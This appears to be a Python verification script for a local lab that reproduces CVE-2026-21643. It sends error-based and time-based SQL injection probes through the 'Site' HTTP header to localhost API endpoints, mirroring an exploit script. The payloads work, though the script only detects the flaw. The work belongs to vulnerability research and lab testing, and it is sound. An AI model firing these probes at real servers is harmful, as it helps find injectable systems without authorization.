#!/usr/bin/env python3
"""Quick verification that CVE-2026-21643 lab endpoints match the exploit script expectations."""
import requests
import time
import urllib3

urllib3.disable_warnings()
BASE = "http://localhost:3000"

# ── Test 1: Normal init_consts (no injection) ─────────────────────────────
r = requests.get(f"{BASE}/api/v1/init_consts", headers={"Site": "default"})
print(f"[init_consts normal] status={r.status_code}  body={r.text[:80]}")

# ── Test 2: Error-based SQLi probe (from exploit script) ─────────────────
payload = "x'; SELECT CAST('alireza_cve_2026_21643_test' AS int)--"
r = requests.get(f"{BASE}/api/v1/init_consts", headers={"Site": payload})
found = "alireza_cve_2026_21643_test" in r.text
print(f"[init_consts SQLi]   status={r.status_code}  probe_in_body={found}")
print(f"  body={r.text[:120]}")
print(f"  EXPLOIT WOULD REPORT: {'VULNERABLE' if r.status_code == 500 and found else 'NOT VULNERABLE'}")

print("-" * 50)

# ── Test 3: Baseline signin timing ───────────────────────────────────────
t0 = time.time()
r = requests.post(f"{BASE}/api/v1/auth/signin",
                  headers={"Site": "default", "Connection": "close"},
                  timeout=15)
baseline = time.time() - t0
print(f"[signin baseline]    status={r.status_code}  time={baseline:.2f}s")

# ── Test 4: Time-based SQLi probe (from exploit script) ──────────────────
t0 = time.time()
r = requests.post(f"{BASE}/api/v1/auth/signin",
                  headers={"Site": "x'; SELECT pg_sleep(5)--", "Connection": "close"},
                  timeout=25)
injected = time.time() - t0
delay_detected = injected > (baseline + 8)
print(f"[signin time-based]  status={r.status_code}  time={injected:.2f}s  delay_detected={delay_detected}")
print(f"  EXPLOIT WOULD REPORT: {'VULNERABLE' if delay_detected else 'NOT VULNERABLE'}")
